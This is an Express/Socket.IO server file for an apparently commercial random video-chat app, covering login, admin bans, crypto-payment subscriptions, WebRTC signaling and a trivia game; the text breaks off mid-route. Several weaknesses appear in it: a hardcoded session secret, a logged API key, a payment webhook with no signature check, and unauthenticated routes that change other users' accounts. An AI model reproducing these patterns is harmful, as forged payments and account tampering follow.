const express = require("express");
const session = require("express-session");
const passport = require("passport");
const authRoutes = require("./Server/routes/auth");
const path = require("path");
const bodyparser = require("body-parser");
const ReportDB = require("./Server/model/reports");
// const BannedIP = require("./Server/model/model");
const app = express();
const dotenv = require("dotenv");
const connectDB = require("./Server/database/connection");
const mongoose = require("mongoose");
var UserDB = require("./Server/model/model");
const MongoStore = require("connect-mongo");
const { Strategy: GoogleStrategy } = require("passport-google-oauth20");
const LocalStrategy = require("passport-local").Strategy;
const bcrypt = require("bcryptjs");
dotenv.config({ path: "config.env" });
// const PORT = process.env.PORT || 8080;
const PORT = 3000;
const moment = require("moment");
const fs = require("fs");
const axios = require("axios");
const cron = require("node-cron");
const upload = require("./Server/services/upload");
const userTimers = {};
const games = {};
const questions = JSON.parse(fs.readFileSync("./questions.json", "utf8"));

const ADMIN = {
  username: process.env.ADMIN_DASH_ID,
  password: process.env.ADMIN_DASH_PASS,
};
const NOWPAY_API_KEY = process.env.NOWPAY_API_KEY;

console.log(NOWPAY_API_KEY);

//auth based codes -- start
// Utility to get IP
function getIP(socket) {
  let ip =
    socket.handshake.headers["x-forwarded-for"] || socket.handshake.address;

  // x-forwarded-for can be a list: "client, proxy1, proxy2"
  if (ip.includes(",")) {
    ip = ip.split(",")[0].trim(); // take first IP (client IP)
  }

  // Strip IPv6 prefix if present
  if (ip.startsWith("::ffff:")) {
    ip = ip.replace("::ffff:", "");
  }

  return ip;
}

app.use(
  session({
    secret: "your_secret_key", // Change this to a strong secret
    resave: false,
    saveUninitialized: true,
    store: MongoStore.create({
      mongoUrl: process.env.MONGO_URI, // Directly use your MongoDB URI
      collectionName: "sessions",
      ttl: 14 * 24 * 60 * 60, // Optional: session TTL in seconds (14 days)
    }),
    cookie: {
      maxAge: 1000 * 60 * 60 * 24 * 7, // 7 days
    },
  })
);
// Passport middleware
app.use(passport.initialize());
app.use(passport.session());

// Middleware to protect admin routes
function isAdmin(req, res, next) {
  if (req.session && req.session.isAdmin) {
    next();
  } else {
    res.redirect("/admin/login");
  }
}
//Email Login OAuth Strategy
passport.use(
  new LocalStrategy(
    { usernameField: "email" },
    async (email, password, done) => {
      try {
        const user = await UserDB.findOne({ email });
        if (!user) return done(null, false, { message: "No user found" });
        if (!user.password)
          return done(null, false, { message: "Use Google Login" });

        const isMatch = await bcrypt.compare(password, user.password);
        if (!isMatch)
          return done(null, false, { message: "Incorrect password" });

        return done(null, user);
      } catch (err) {
        return done(err);
      }
    }
  )
);

// Google OAuth Strategy
passport.use(
  new GoogleStrategy(
    {
      clientID: process.env.GOOGLE_CLIENT_ID,
      clientSecret: process.env.GOOGLE_CLIENT_SECRET,
      callbackURL:
        "/auth/google/callback",
      // callbackURL: "/auth/google/callback",
    },
    async (accessToken, refreshToken, profile, done) => {
      const user = {
        id: profile.id,
        name: profile.displayName,
        email: profile.emails[0].value,
        photo: profile.photos[0].value,
      };
      return done(null, user);
    }
  )
);

// Serialize and Deserialize User
passport.serializeUser((user, done) => done(null, user));
passport.deserializeUser((user, done) => done(null, user));
//auth based codes -- end

connectDB();
app.use(bodyparser.urlencoded({ extended: true }));

app.use(bodyparser.json());

app.set("view engine", "ejs");

app.use(
  "/css",
  express.static(path.resolve(__dirname, "Assets/css"), {
    maxAge: "1y",
    immutable: true,
  })
);
app.use(
  "/img",
  express.static(path.resolve(__dirname, "Assets/img"), {
    maxAge: "1y",
    immutable: true,
  })
);
app.use(
  "/js",
  express.static(path.resolve(__dirname, "Assets/js"), {
    maxAge: "1y",
    immutable: true,
  })
);
// app.use("/css", express.static(path.resolve(__dirname, "Assets/css")));
// app.use("/img", express.static(path.resolve(__dirname, "Assets/img")));
// app.use("/js", express.static(path.resolve(__dirname, "Assets/js")));
app.use("/auth", authRoutes);
app.use(express.static(path.join(__dirname, "public")));
app.use("/", require("./Server/routes/router"));

var server = app.listen(PORT, () => {
  console.log(`Server is running on http://localhost:${PORT}`);
});

const io = require("socket.io")(server, {
  allowEIO3: true,
});

var userConnection = [];

cron.schedule("0 0 1 * *", async () => {
  try {
    console.log("Running monthly freeLimit reset...");

    // Update all users' freeLimit to 15
    const result = await UserDB.updateMany({}, { $set: { freeLimit: 15 } });

    console.log(`Updated ${result.modifiedCount} users.`);
  } catch (error) {
    console.error("Error updating freeLimit:", error);
  }
});

app.get("/admin/login", (req, res) => {
  if (req.session.isAdmin) {
    return res.redirect("/admin/dashboard"); // Redirect if already logged in
  }
  res.render("login", { error: null });
});

// Login logic
app.post("/admin/login", (req, res) => {
  const { username, password } = req.body;

  if (username === ADMIN.username && password === ADMIN.password) {
    req.session.isAdmin = true;
    res.redirect("/admin/dashboard");
  } else {
    res.render("login", { error: "Invalid credentials" });
  }
});

app.get("/admin/dashboard", isAdmin, (req, res) => {
  res.render("admin-dashboard");
});

// app.get("/admin/logout", (req, res) => {
//   delete req.session.admin; // Remove only the admin session key
//   res.redirect("/admin/login");
// });

app.get("/admin/logout", (req, res) => {
  req.session.destroy((err) => {
    if (err) {
      console.error("Error destroying session:", err);
      return res.redirect("/admin/dashboard"); // fallback if logout fails
    }
    res.clearCookie("connect.sid"); // clear cookie
    res.redirect("/admin/login");
  });
});

app.post("/admin/delete-ban", isAdmin, async (req, res) => {
  const { userID } = req.body;
  const user = await UserDB.findByIdAndUpdate(userID, {
    isBanned: false,
    banReason: "",
    banExpiresAt: null,
  });
  if (!user) {
    return res.status(404).json({ error: "User not found" });
  }
  // console.log("User unbanned: ", user);

  res.redirect("/admin/dashboard");
});
app.post("/admin/ban-user", isAdmin, async (req, res) => {
  const { userID, Reason, permenant, reportID } = req.body;
  try {
    if (permenant == "Permanent") {
      await UserDB.findByIdAndUpdate(userID, {
        isBanned: true,
        banReason: Reason,
        banExpiresAt: null, // Permanent ban
      });
    } else if (permenant == "10HOUR") {
      await UserDB.findByIdAndUpdate(userID, {
        isBanned: true,
        banReason: Reason,
        banExpiresAt: new Date(Date.now() + 10 * 60 * 60 * 1000), // 10 hours
      });
    } else if (permenant == "1DAY") {
      await UserDB.findByIdAndUpdate(userID, {
        isBanned: true,
        banReason: Reason,
        banExpiresAt: new Date(Date.now() + 24 * 60 * 60 * 1000), // 1 day
      });
    } else if (permenant == "7DAY") {
      await UserDB.findByIdAndUpdate(userID, {
        isBanned: true,
        banReason: Reason,
        banExpiresAt: new Date(Date.now() + 7 * 24 * 60 * 60 * 1000), // 7 days
      });
    }

    // If reportID is provided, mark it Handled
    if (reportID) {
      await ReportDB.findByIdAndUpdate(reportID, {
        handled: true,
      });
    }
  } catch (error) {
    console.error("Error banning user:", error);
    return res.status(500).json({ error: "Failed to ban user" });
  }
  // console.log("User banned: ", userID, "Reason: ", Reason, "Till: ", permenant);
  res.redirect("/admin/dashboard");
});

app.post("/admin/delete-report", isAdmin, async (req, res) => {
  const { reportID } = req.body;
  const report = await ReportDB.findByIdAndDelete(reportID);
  if (!report) {
    return res.status(404).json({ error: "Report not found" });
  }
  res.redirect("/admin/dashboard");
});

app.get("/admin-reports", isAdmin, async (req, res) => {
  try {
    const reports = await ReportDB.find().sort({ timestamp: -1 }).limit(100);
    res.json(reports);
  } catch (err) {
    console.error("Error fetching reports:", err);
    res.status(500).json({ error: "Failed to fetch reports" });
  }
});

app.get("/admin/banned-users", isAdmin, async (req, res) => {
  try {
    const bannedUsers = await UserDB.find({ isBanned: true });
    res.json(bannedUsers);
  } catch (err) {
    console.error("Error fetching banned users:", err);
    res.status(500).json({ error: "Failed to fetch banned users" });
  }
});

app.post("/upload-avatar", upload.single("avatar"), async (req, res) => {
  if (req.isAuthenticated()) {
    const email = req.session.passport.user.email;
    const user = await UserDB.findOne({ email: email });

    if (!req.file) return res.status(400).send("No file uploaded");

    const newProfilePicUrl = `/uploads/${req.file.filename}`;

    try {
      if (user.pfp && user.pfp.startsWith("/uploads/")) {
        const oldFile = path.resolve(process.cwd(), "public", "." + user.pfp);
        await fs.promises.unlink(oldFile);
      }
    } catch (err) {
      if (err.code === "ENOENT") {
      } else {
      }
    }

    user.pfp = newProfilePicUrl;
    await user.save();

    res.redirect("/Settings"); // or wherever
  } else {
    res.status(500).json({ error: "Internal Server Error" });
  }
});

app.post("/Update-Username", async (req, res) => {
  if (req.isAuthenticated()) {
    try {
      const { username } = req.body;
      const email = req.user.email;

      if (!username) {
        return res.status(400).json({ error: "Username is required" });
      }

      const updatedUser = await UserDB.findOneAndUpdate(
        { email },
        { name: username },
        { new: true }
      );

      if (!updatedUser) {
        return res.status(404).json({ error: "User not found" });
      }

      // console.log("Updated user:", updatedUser);
      res.json({ success: true, updatedUser });
    } catch (err) {
      console.error("Error updating username:", err);
      res.status(500).json({ error: "Internal Server Error" });
    }
  } else {
    res.status(500).json({ error: "Internal Server Error" });
  }
});

app.get("/Settings", async (req, res) => {
  if (req.isAuthenticated()) {
    const user = await UserDB.findOne({ email: req.user.email });
    const loginType = user.password ? "Email" : "Google";
    res.render("settings", {
      name: user.name,
      email: user.email,
      sub: user.sub,
      Login: loginType,
      pfp: user.pfp,
      proDuration: user.proDuration,
      isGuest: user.isGuest,
      gender: user.gender,
      country: user.country,
    });
  } else {
    res.redirect("/");
  }
});

app.get("/", async (req, res) => {
  if (req.isAuthenticated()) {
    const usera = await UserDB.findOne({ email: req.user.email });

    if (!usera) {
      res.render("index-nologin");
      return;
    }

    if (usera.isBanned) {
      if (usera.banExpiresAt && usera.banExpiresAt < Date.now()) {
        // Ban expired, clear it
        usera.isBanned = false;
        usera.banExpiresAt = null;
        await usera.save();
      } else {
        // Still banned — render a page
        const banMessage = usera.banExpiresAt
          ? `You are banned until ${new Date(
              usera.banExpiresAt
            ).toLocaleString()}.`
          : `You are permanently banned. Reason: ${usera.banReason}`;
        return res.render("banned", { message: banMessage });
      }
    }

    if (req.query.Limitreached) {
      res.render("index", { user: req.user, usera: usera, limitReached: true });
    } else {
      // console.log(usera.isGuest)
      res.render("index", { user: req.user, usera: usera });
    }
  } else {
    // res.redirect("/auth/google");
    res.render("index-nologin");
  }
});

app.get("/complete-profile", (req, res) => {
  if (req.user && req.user.gender && req.user.country && req.user.age) {
    res.redirect("/");
  } else {
    res.render("complete-profile");
  }
});

app.post("/complete-profile", async (req, res) => {
  const { gender, country, age } = req.body;

  if (!req.isAuthenticated()) {
    return res.redirect("/");
  }

  try {
    await UserDB.findOneAndUpdate(
      { email: req.user.email },
      { gender, country,age }
    );

    // Update in-session user data
    req.user.age = age;
    req.user.gender = gender;
    req.user.country = country;

    res.redirect("/");
  } catch (err) {
    console.error("Error updating profile:", err);
    res.status(500).send("Something went wrong.");
  }
});

app.get("/video_chat", async (req, res) => {
  if (req.isAuthenticated()) {
    const usera = await UserDB.findOne({ email: req.user.email });
    console.log("Line 472",usera.age)
    if (!usera.gender && !usera.country) {
      return res.redirect("/complete-profile");
    }
    if(usera.age === null){
      return res.redirect("/complete-profile");
    }
    if (!usera) {
      // if(req.user.photo){
      //   res.render("video_chat", { user: req.user, img: req.user.photo });

      // }else{
      //   res.render("video_chat", { user: req.user, img: req.user.pfp });
      // }
      res.render("video_chat", { user: usera, img: usera.pfp });
    } else {
      if (usera.isBanned) {
        if (usera.banExpiresAt && usera.banExpiresAt < Date.now()) {
          // Ban expired, clear it
          usera.isBanned = false;
          usera.banExpiresAt = null;
          await usera.save();
        } else {
          // Still banned — render a page
          const banMessage = usera.banExpiresAt
            ? `You are banned until ${new Date(
                usera.banExpiresAt
              ).toLocaleString()}.`
            : `You are permanently banned. Reason: ${usera.banReason}`;
          return res.render("banned", { message: banMessage });
        }
      }
      res.render("video_chat", { user: usera, img: usera.pfp });
    }
  } else {
    res.redirect("/");
  }
});

async function checkExpiredSubscriptions() {
  const today = new Date().toISOString().split("T")[0]; // Get today's date in "YYYY-MM-DD" format

  const expiredSubscriptions = await UserDB.find({
    proDuration: { $lt: new Date(today) },
    sub: "pro",
  });

  if (expiredSubscriptions.length > 0) {
    for (let sub of expiredSubscriptions) {
      sub.proDuration = null; // Remove expiration date
      sub.sub = "free"; // Update status
      await sub.save();
    }
    console.log(
      `Marked ${expiredSubscriptions.length} subscriptions as expired.`
    );
  } else {
    console.log("No expired subscriptions today.");
  }
}

// Run the expiry check every 24 hours
setInterval(checkExpiredSubscriptions, 24 * 60 * 60 * 1000); // 24 hours

const THISURL = process.env.BASE_URL;

app.post("/create-invoice-subscription", async (req, res) => {
  const { plan } = req.body; // e.g., "1", "3", etc.
  const userMail = req.user.email;

  const planMap = {
    0.3: 5,
    1: 13,
    6: 30,
  };

  const planId = planMap[plan];
  if (!planId) return res.status(400).json({ message: "Invalid plan." });
  console.log("Plan ID is: ", planId);

  try {
    const response = await axios.post(
      "https://api.nowpayments.io/v1/invoice",
      {
        price_amount: planId, // USD price
        price_currency: "usd",
        order_id: `${userMail}-${Date.now()}`,
        success_url: `${THISURL}/success/${userMail}`,
        order_description: `email:${userMail}`,
        cancel_url: `${THISURL}/cancel`,
        ipn_callback_url: `${THISURL}/webhook`,
      },
      {
        headers: { "x-api-key": NOWPAY_API_KEY },
      }
    );

    // res.redirect();
    console.log(response.data);
    res.json({ url: response.data.invoice_url });
  } catch (err) {
    console.error(err.response ? err.response.data : err.message);
    res.status(500).send("Error creating invoice");
  }
});

app.post("/cancel-subscription", async (req, res) => {
  try {
    const { userEmail } = req.body;
    const user = await UserDB.findOne({ email: userEmail });

    if (!user || !user.subscriptionId) {
      return res
        .status(404)
        .json({ message: "User not found or no subscription ID" });
    }

    user.sub = "free";
    user.subscriptionId = null;
    user.proDuration = null;
    await user.save();

    res.json({ message: "Subscription canceled successfully" });
  } catch (error) {
    console.error("Cancel error:", error.response?.data || error.message);
    res.status(500).json({ message: "Failed to cancel subscription" });
  }
});

app.post("/webhook", express.json(), async (req, res) => {
  const { order_id, payment_status } = req.body;
  const data = req.body;
  console.log("Webhook received:", order_id, payment_status);

  if (data.payment_status === "finished") {
    const emailMatch = data.order_description.match(/email:(.*)/);
    const userEmail = emailMatch ? emailMatch[1] : null;
    console.log("Payment successful for:", userEmail);
    console.log("Update DB for:", userEmail);

    let durration;
    if (data.price_amount == 5) {
      durration = 7; // 1 week
    } else if (data.price_amount == 13) {
      durration = 30; // 1 months
    } else if (data.price_amount == 30) {
      durration = 180; // 6 months
    } else {
      durration = 0; // free
    }
    const endDate = new Date();
    endDate.setDate(endDate.getDate() + durration);

    // Update user in MongoDB
    const result = await UserDB.updateOne(
      { email: userEmail },
      {
        $set: {
          sub: "pro",
          proDuration: endDate,
          subscriptionId: data.order_id,
        },
      }
    );

    if (result.modifiedCount === 0) {
      console.log("User not found or already up to date.");
    } else {
      console.log("User subscription updated:", userEmail);
    }

    const updatedUser = await UserDB.findOne({ email: userEmail });
    console.log("Updated user:", updatedUser);
  }
  res.sendStatus(200);
});

app.get("/maillogin", async (req, res) => {
  if (req.isAuthenticated()) {
    res.redirect("/");
  } else {
    res.render("mail-login");
  }
});

app.get("/contact", async (req, res) => {
  res.render("contact");
});
app.get("/terms-service", async (req, res) => {
  res.render("terms");
});
app.get("/privacy-policy", async (req, res) => {
  res.render("privacy");
});
app.get("/refund-policy", async (req, res) => {
  res.render("refund");
});
function getNextQuestion(index = 0) {
  return questions[index % questions.length]; // loops if out of bounds
}

function checkAnswer(userAnswer, question) {
  const correctAnswer = question.answers.find(
    (a) => a.answer.toLowerCase() === userAnswer.trim().toLowerCase()
  );
  return correctAnswer ? correctAnswer.points : 0;
}

function findSocketByUserId(userId) {
  const user = userConnection.find((o) => o.user_id === userId);
  return user ? user.connectionId : null;
}

// Shuffle an array in place and return it
function shuffleArray(array) {
  for (let i = array.length - 1; i > 0; i--) {
    const j = Math.floor(Math.random() * (i + 1));
    // Swap elements i and j
    [array[i], array[j]] = [array[j], array[i]];
  }
  return array;
}

io.on("connection", (socket) => {
  console.log("Socket id is: ", socket.id);

  socket.on("requestGame", async ({ opponentId }) => {
    const opponentSocket = findSocketByUserId(opponentId);
    console.log("Opponent Socket is: ", opponentSocket);

    // opponentSocket is currently just the socket ID string
    const opponentSocketId = opponentSocket; // e.g., "1xZmXMh0LesiQpPaAAAC"

    // Get the actual Socket object
    const opponentSocketObj = io.sockets.sockets.get(opponentSocketId);

    if (!opponentSocketObj) return;

    const roomId = `game_${socket.id}_${opponentSocketId}`;
    socket.join(roomId); // your socket joins
    opponentSocketObj.join(roomId); // opponent's actual socket joins

    const questionsShuffled = shuffleArray([...questions]); // shuffle questions
    games[roomId] = {
      players: [socket.id, opponentSocket],
      scores: { [socket.id]: 0, [opponentSocket]: 0 },
      strikes: { [socket.id]: 0, [opponentSocket]: 0 },
      questions: questionsShuffled,
      currentQuestionIndex: 0,
      answersCount: 0,
    };

    io.to(roomId).emit("gameStart", {
      question: questionsShuffled[0],
      roomId,
    });
  });

  // socket.on("submitAnswer", ({ roomId, answer }) => {
  //   const game = games[roomId];
  //   if (!game) return;

  //   const question = game.questions[game.currentQuestionIndex];
  //   const points = checkAnswer(answer, question); // returns 0 if wrong

  //   if (points > 0) {
  //     // game.answersCount += 1;
  //     // correct answer: add points
  //     let myUs = userConnection.find((o) => o.connectionId === socket.id);
  //     let index = question.answers.findIndex(
  //       (a) => a.answer.toLowerCase() === answer.toLowerCase()
  //     );
  //     game.scores[socket.id] += points;
  //     io.to(roomId).emit("revealAnswer", {
  //       player: myUs.user_id,
  //       answer,
  //       points,
  //       index,
  //       scores: game.scores,
  //     });
  //   } else {
  //     // wrong answer: add strike
  //     game.strikes[socket.id] += 1;
  //     io.to(roomId).emit("strikeUpdate", {
  //       player: socket.id,
  //       strikes: game.strikes,
  //     });

  //     // check if strikes == 3
  //     if (game.strikes[socket.id] >= 3) {
  //       io.to(roomId).emit("gameOver", {
  //         reason: "strikeLimit",
  //         scores: game.scores,
  //       });
  //       delete games[roomId];
  //       return;
  //     }
  //   }

  //   // track answers count
  //   game.answersCount += 1;

  //   // move to next question if both players answered
  //   if (game.answersCount >= 2) {
  //     game.answersCount = 0;
  //     game.currentQuestionIndex += 1;

  //     if (game.currentQuestionIndex >= game.questions.length) {
  //       console.log(
  //         "Game Over: All questions answered",
  //         game.currentQuestionIndex,
  //         game.questions.length
  //       );
  //       // all questions completed
  //       const winner = Object.entries(game.scores).sort(
  //         (a, b) => b[1] - a[1]
  //       )[0];
  //       console.log("Winner is: ", winner);
  //       io.to(roomId).emit("gameWin", {
  //         scores: game.scores,
  //         winner,
  //       });
  //       delete games[roomId];
  //     } else {
  //       // send next question
  //       io.to(roomId).emit("nextQuestion", {
  //         question: game.questions[game.currentQuestionIndex],
  //       });
  //     }
  //   }
  // });

  socket.on("gameClosed", (data) => {
    console.log(data)
    const game = games[data.roomId];
    const opponent = userConnection.find((o) => o.user_id === data.remoteUser);
    if (!game || !opponent) return;
    console.log(opponent.connectionId)
    socket.to(opponent.connectionId).emit("gameClosed", {
      player1: data.playerId,
      player2: opponent.connectionId,
      reason: data.reason,
      scores: game.scores,
    });
    delete games[data.roomId];
  })

  socket.on("submitAnswer", ({ roomId, answer }) => {
    const game = games[roomId];
    if (!game) return;
    console.log(game)
    const question = game.questions[game.currentQuestionIndex];
    const points = checkAnswer(answer, question); // returns 0 if wrong

    if (points > 0) {
      // correct answer: add points
      let myUs = userConnection.find((o) => o.connectionId === socket.id);
      let index = question.answers.findIndex(
        (a) => a.answer.toLowerCase() === answer.toLowerCase()
      );
      game.scores[socket.id] += points;
      io.to(roomId).emit("revealAnswer", {
        player: myUs.user_id,
        answer,
        points,
        index,
        scores: game.scores,
      });
    game.answersCount += 1;
    } else {
      // wrong answer: add strike
      game.strikes[socket.id] += 1;
      io.to(roomId).emit("strikeUpdate", {
        player: socket.id,
        strikes: game.strikes,
      });

      // // check if strikes == 3
      // if (game.strikes[socket.id] >= 3) {
      //   io.to(roomId).emit("gameOver", {
      //     reason: "strikeLimit",
      //     scores: game.scores,
      //   });
      //   delete games[roomId];
      //   return;
      // }
    }

    // track answers count

    if (Object.values(game.scores).some(score => score >= 120)) {
        console.log(
          "Game Over: Winner found",
          game.currentQuestionIndex,
          game.questions.length
        );
        // all questions completed
        const winner = Object.entries(game.scores).sort(
          (a, b) => b[1] - a[1]
        )[0];
        console.log("Winner is: ", winner);
        io.to(roomId).emit("gameWin", {
          scores: game.scores,
          winner,
        });
        delete games[roomId];
        return
      }

    // move to next question if both players answered
    if (game.answersCount >= 2) {
      game.answersCount = 0;
      game.currentQuestionIndex += 1;
      console.log(Object.values(game.scores).some(score => score >= 120));
      // if (game.currentQuestionIndex >= Math.min(game.questions.length, 5)) {
      // if (Object.values(game.scores).some(score => score >= 120)) {
      //   console.log(
      //     "Game Over: Winner found",
      //     game.currentQuestionIndex,
      //     game.questions.length
      //   );
      //   // all questions completed
      //   const winner = Object.entries(game.scores).sort(
      //     (a, b) => b[1] - a[1]
      //   )[0];
      //   console.log("Winner is: ", winner);
      //   io.to(roomId).emit("gameWin", {
      //     scores: game.scores,
      //     winner,
      //   });
      //   delete games[roomId];
      // } else {
        setTimeout(() => {

          // send next question
          io.to(roomId).emit("nextQuestion", {
            question: game.questions[game.currentQuestionIndex],
          });
        }, 3000);
      // }
    }
  });

  socket.on("remove-filters-match", async (userId) => {
    try {
      await UserDB.findByIdAndUpdate(userId, {
        preferedGender: null,
        preferedCountry: null,
      });
      console.log(`Filters removed for user ${userId}`);
      // Optional: send confirmation back to client
    } catch (err) {
      console.error("Failed to remove filters:", err);
    }
  });

  socket.on("start-filter", async (userNAME) => {
    console.log("Filter Started");
    const user = await UserDB.findById(userNAME);
    if (!user) return;

    const now = new Date();
    const today = new Date(now.getFullYear(), now.getMonth(), now.getDate());

    if (user.sub === "pro") return; // No limit

    // Reset usage if it’s a new day
    if (!user.filterUsage || user.filterUsage.date < today) {
      user.filterUsage = { date: now, duration: 0 };
    }

    const remaining = Math.max(0, 5 * 60 * 1000 - user.filterUsage.duration);
    if (remaining <= 0) {
      socket.emit("disable-filter");
      return;
    }

    // Start timer to disable after remaining time
    if (userTimers[socket.id]) clearTimeout(userTimers[socket.id]);

    const timeout = setTimeout(async () => {
      socket.emit("disable-filter");
      console.log("Filter usage limit reached, disabling filter");
      // Update usage in DB
      user.filterUsage.duration = 5 * 60 * 1000;
      user.filterUsage.date = now;
      await user.save();

      delete userTimers[socket.id];
    }, remaining);

    userTimers[socket.id] = timeout;
    socket._filterStartTime = Date.now();
  });

  socket.on("stop-filter", async (userId) => {
    console.log("Filter Stopped");
    const user = await UserDB.findById(userId);
    if (!user) return;

    const startTime = socket._filterStartTime;
    if (!startTime) return;

    const sessionTime = Date.now() - startTime;

    const now = new Date();
    const today = new Date(now.getFullYear(), now.getMonth(), now.getDate());

    if (!user.filterUsage || user.filterUsage.date < today) {
      user.filterUsage = { date: now, duration: sessionTime };
    } else {
      user.filterUsage.duration += sessionTime;
    }

    await user.save();
    clearTimeout(userTimers[socket.id]);
    delete userTimers[socket.id];
  });
  socket.on("report-user", async ({ reportedId, reason }) => {
    try {
      if (!reportedId) {
        return;
      }
      var reporterU = userConnection.find((o) => o.connectionId === socket.id);
      const reporterId = reporterU ? reporterU.user_id : "Unknown";

      const existingReport = await ReportDB.findOne({
        reportedId: reportedId,
        reporterId: reporterId,
      });

      if (existingReport) {
        return res
          .status(400)
          .json({ message: "You have already reported this user." });
      }

      const report = new ReportDB({ reporterId, reportedId, reason });
      await report.save();

      console.log(`User ${reporterId} reported ${reportedId} for: ${reason}`);

      const unhandledReports = await ReportDB.find({
        reportedId,
        handled: false,
      });
      const reportCount = unhandledReports.length;
      // const reportCount = await ReportDB.countDocuments({ reportedId });
      if (reportCount >= 10) {
        const reportedUser = await UserDB.findById(reportedId);
        if (!reportedUser) return;

        if (reportedUser.sub !== "pro") {
          // Ban temporarily for 10 hours
          const banUntil = new Date(Date.now() + 10 * 60 * 60 * 1000); // 10 hours
          reportedUser.banExpiresAt = banUntil;
          reportedUser.banReason = "10-hour ban due to multiple reports";
          await reportedUser.save();
          console.log(
            `User ${reportedId} temporarily banned until ${banUntil}`
          );

          await ReportDB.updateMany(
            { reportedId, handled: false },
            { $set: { handled: true } }
          );
        }
      }
      if (reportCount >= 15) {
        const reportedUser = await UserDB.findById(reportedId);
        if (!reportedUser) return;

        if (reportedUser.sub === "pro") {
          // Ban temporarily for 7 hours
          const banUntil = new Date(Date.now() + 7 * 60 * 60 * 1000); // 7 hours
          reportedUser.banExpiresAt = banUntil;
          reportedUser.banReason = "7-hour ban due to multiple reports";
          await reportedUser.save();
          console.log(
            `User ${reportedId} temporarily banned until ${banUntil}`
          );

          await ReportDB.updateMany(
            { reportedId, handled: false },
            { $set: { handled: true } }
          );
        }
      }
    } catch (err) {
      console.error("Error saving report:", err);
    }
  });

  // socket.on("report-user", async ({ reportedId, reason }) => {
  //   console.log("hdhfkjdhjkfhkj")
  //   const reporterEmail = socket.email;
  //   const reporterIP = getIP(socket);

  //   const reportedSocket = io.sockets.sockets.get(reportedId);
  //   const reportedEmail = reportedSocket?.email || "Unknown";
  //   const reportedIP = reportedSocket ? getIP(reportedSocket) : null;

  //   const report = new ReportDB({
  //     reporterId: reporterEmail, // changed
  //     reportedId: reportedEmail, // changed
  //     reporterIP,
  //     reportedIP,
  //     reason,
  //   });

  //   await report.save();
  //   console.log("User reported:", report);

  //   if (!reportedIP) {
  //     console.warn("Reported IP is null. Skipping ban.");
  //     return;
  //   }

  //   console.log("Reported IP:", reportedIP);
  //   const count = await ReportDB.countDocuments({ reportedIP });
  //   if (count >= 3) {
  //     const alreadyBanned = await BannedIP.findOne({ ip: reportedIP });
  //     if (!alreadyBanned) {
  //       await BannedIP.create({
  //         ip: reportedIP,
  //         reason: "Auto-banned after 3 reports",
  //       });
  //       console.log(`Auto-banned IP: ${reportedIP}`);
  //     }
  //   }
  // });

  socket.on("userconnect", (data) => {
    socket.mail = data.email;

    console.log("from line 593", socket.mail);
    console.log("Logged in username", data.displayName);
    userConnection.push({
      connectionId: socket.id,
      user_id: data.displayName,
    });

    var userCount = userConnection.length;
    console.log("UserCount", userCount);
    userConnection.map(function (user) {
      console.log("Username is: ", user.user_id);
    });
    console.log("UserConnection is: ", userConnection);
  });
  socket.on("offerSentToRemote", async (data) => {
    // const user = await UserDB.findById(data.username);
    // const Ruser = await UserDB.findById(data.remoteUser);
    // if (
    //   Ruser.preferedGender &&
    //   Ruser.preferedGender !== user.gender
    // ) {
    //   console.log("Caller doesn't match receiver's gender preference");
    //   return;
    // }

    // if (
    //   Ruser.preferedCountry &&
    //   Ruser.preferedCountry !== user.country
    // ) {
    //   console.log("Caller doesn't match receiver's country preference");
    //   return;
    // }
    var offerReceiver = userConnection.find(
      (o) => o.user_id === data.remoteUser
    );
    if (offerReceiver) {
      console.log("OfferReceiver user is: ", offerReceiver.connectionId);
      socket.to(offerReceiver.connectionId).emit("ReceiveOffer", data);
    }
  });
  socket.on("answerSentToUser1", async (data) => {
    if (data.answer) {
      console.log("heheheh");
    }
    const user1 = await UserDB.findById({ _id: data.sender });
    const user2 = await UserDB.findById({ _id: data.receiver });
    if (user1.sub == "free") {
      user1.freeLimit = user1.freeLimit - 1;
      await user1.save();
    }
    if (user2.sub == "free") {
      user2.freeLimit = user2.freeLimit - 1;
      await user2.save();
    }
    var answerReceiver = userConnection.find(
      (o) => o.user_id === data.receiver
    );
    if (answerReceiver) {
      console.log("answerReceiver user is: ", answerReceiver.connectionId);
      socket.to(answerReceiver.connectionId).emit("ReceiveAnswer", data);
    }
  });
  socket.on("candidateSentToUser", async (data) => {
    const user = await UserDB.findById(data.username);
    // const Ruser = await UserDB.findById(data.remoteUser);
    // if (
    //   Ruser.preferedGender &&
    //   Ruser.preferedGender !== user.gender
    // ) {
    //   console.log("Caller doesn't match receiver's gender preference");
    //   return;
    // }

    // if (
    //   Ruser.preferedCountry &&
    //   Ruser.preferedCountry !== user.country
    // ) {
    //   console.log("Caller doesn't match receiver's country preference");
    //   return;
    // }
    // console.log("User is: ", user);
    // user.freeLimit = user.freeLimit - 1;
    // await user.save();
    // console.log("Updated User is: ", user);
    // console.log("Received ICE candidate:", data);
    data.name = user.name;
    var candidateReceiver = userConnection.find(
      (o) => o.user_id === data.remoteUser
    );
    if (candidateReceiver) {
      console.log(
        "candidateReceiver user is: ",
        candidateReceiver.connectionId
      );
      socket.to(candidateReceiver.connectionId).emit("candidateReceiver", data);
    }
  });

  socket.on("disconnect", async () => {
    console.log("User disconnected");
    console.log(socket.id);
    if (userTimers[socket.id]) {
      clearTimeout(userTimers[socket.id]);
      delete userTimers[socket.id];
    }
    var leftU = userConnection.find((o) => o.connectionId === socket.id);
    if (leftU) {
      UserDB.updateOne(
        { _id: leftU.user_id },
        { $set: { active: "no", status: "0" } }
      ).then((data) => {
        if (!data) {
          console.log("ERROR");
        } else {
          console.log("1 document updated");
        }
      });
    }
    userConnection = userConnection.filter((p) => p.connectionId !== socket.id);
    const activeUserIds = userConnection.map((user) => user.user_id);
    console.log("Remaining active users:", activeUserIds);

    // Set all users NOT in activeUserIds as inactive
    await UserDB.updateMany(
      { _id: { $nin: activeUserIds } }, // Exclude active users
      { $set: { active: "no", status: "0" } }
    );

    console.log(
      "All inactive users set to active: 'no', Active UserID's:",
      activeUserIds
    );
  });

  socket.on("remoteUserClosed", (data) => {
    var closedUser = userConnection.find((o) => o.user_id === data.remoteUser);
    if (closedUser) {
      console.log("closedUser user is: ", closedUser.connectionId);
      socket.to(closedUser.connectionId).emit("closedRemoteUser", data);
    }
  });
});
app.post("/remove-userF", async (req, res) => {
  const { _id } = req.body;

  try {
    if (_id) {
      UserDB.updateOne(
        { _id: _id },
        { $set: { active: "no", status: "0" } }
      ).then((data) => {
        if (!data) {
          console.log("ERROR");
        } else {
          console.log("1 document updated");
          res.json({ message: "User removed successfully", data: data });
        }
      });
    }
  } catch (error) {
